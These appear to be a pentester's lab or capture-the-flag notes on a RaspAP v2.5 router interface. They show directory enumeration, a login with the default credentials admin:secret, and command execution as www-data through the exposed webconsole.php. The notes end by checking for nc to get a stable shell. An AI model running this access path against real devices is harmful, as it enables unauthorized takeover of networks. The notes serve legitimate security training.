# 4 :8901 lighttpd 1.4.53 > raspAP

```
http://192.168.125.97:8091/
Popup for Basic Auth.
Not authorized 

$ gobuster dir -u http://192.168.125.97:8091 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 80
===============================================================
/templates            (Status: 301) [Size: 0] [--> http://192.168.125.97:8091/templates/]
/index.php            (Status: 401) [Size: 15]
/includes             (Status: 301) [Size: 0] [--> http://192.168.125.97:8091/includes/]
/ajax                 (Status: 301) [Size: 0] [--> http://192.168.125.97:8091/ajax/]
/app                  (Status: 301) [Size: 0] [--> http://192.168.125.97:8091/app/]
/config               (Status: 301) [Size: 0] [--> http://192.168.125.97:8091/config/]
/dist                 (Status: 301) [Size: 0] [--> http://192.168.125.97:8091/dist/]
/LICENSE              (Status: 200) [Size: 35146]
/locale               (Status: 301) [Size: 0] [--> http://192.168.125.97:8091/locale/]
/installers           (Status: 301) [Size: 0] [--> http://192.168.125.97:8091/installers/]

# every page is size 0 due to no Authorization header.
# tried combination of user from smtp - nothing

# looking at enum
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=RaspAP

# found on google
RaspAP is feature-rich wireless router software that just works on many popular Debian-based devices, including the Raspberry Pi.
https://raspap.com/

# default password works
admin:secret

http://192.168.125.97:8091/
RaspAP Dashboard
| logged in as admin

# version check > About RaspAP
http://192.168.125.97:8091/index.php?page=about
RaspAP v2.5

# found web console
Dashboard > System > Console
# console is too small
# inspect shows 
<iframe src="includes/webconsole.php" class="webconsole"></iframe>
# interesting link https://checkmarx.com/blog/chained-raspap-vulnerabilities-grant-root-level-access/

# found full page webconsole
http://192.168.125.97:8091/includes/webconsole.php

user@192.168.125.97 ~$ whoami;id;hostname;uname -a
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
walla
Linux walla 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux

# stable shell
user@walla /home/walter$ which nc
/usr/bin/nc
```
